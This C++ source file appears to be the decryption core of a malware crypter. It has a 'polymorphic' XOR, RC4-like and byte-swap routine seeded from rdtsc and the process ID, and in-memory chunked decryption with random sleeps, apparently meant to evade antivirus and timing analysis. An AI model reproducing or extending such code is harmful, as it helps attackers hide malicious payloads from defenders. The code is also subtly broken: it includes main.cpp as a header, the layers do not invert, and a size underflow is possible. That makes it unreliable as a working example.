#include "Cryptor.h"
#include <random>
#include <algorithm>
#include <sysinfoapi.h>
#include <processthreadsapi.h>
#include "main.cpp"

uint64_t NanoObfuscator::GenerateRuntimeSeed() {
    uint64_t seed = 0;
    _asm {
        rdtsc
        mov dword ptr[seed], eax
        mov dword ptr[seed + 4], edx
    }
    seed ^= GetTickCount64();
    seed ^= (uint64_t)GetCurrentProcessId() << 32;
    return seed;
}

template<typename T>
void NanoObfuscator::PolymorphEncryptDecrypt(T* data, size_t size, const std::string& key) {
    if (runtimeSeed == 0) {
        runtimeSeed = GenerateRuntimeSeed();
    }

    // Layer 1: XOR with key
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key[i % key.size()];
    }

    // Layer 2: RC4-like stream cipher
    uint8_t s[256];
    for (int i = 0; i < 256; i++) s[i] = i;

    uint8_t j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + s[i] + key[i % key.size()];
        std::swap(s[i], s[j]);
    }

    j = 0;
    uint8_t i = 0;
    for (size_t k = 0; k < size; k++) {
        i++;
        j += s[i];
        std::swap(s[i], s[j]);
        data[k] ^= s[(s[i] + s[j]) & 0xFF];
    }

    // Layer 3: Byte swapping
    for (size_t k = 0; k < size - 1; k += 2) {
        std::swap(data[k], data[k + 1]);
    }
}

bool QuantumDecryptor::DecryptInMemory(const std::string& key, std::vector<unsigned char>& data) {
    if (data.empty() || key.empty()) return false;

    const size_t CHUNK_SIZE = 4096;
    for (size_t offset = 0; offset < data.size(); offset += CHUNK_SIZE) {
        size_t chunkSize = min(CHUNK_SIZE, data.size() - offset);
        NanoObfuscator::PolymorphEncryptDecrypt(
            data.data() + offset,
            chunkSize,
            key + std::to_string(offset)
        );

        if (GetRandom(0, 100) > 70) {
            Sleep(GetRandom(1, 10));
        }
    }
    return true;
}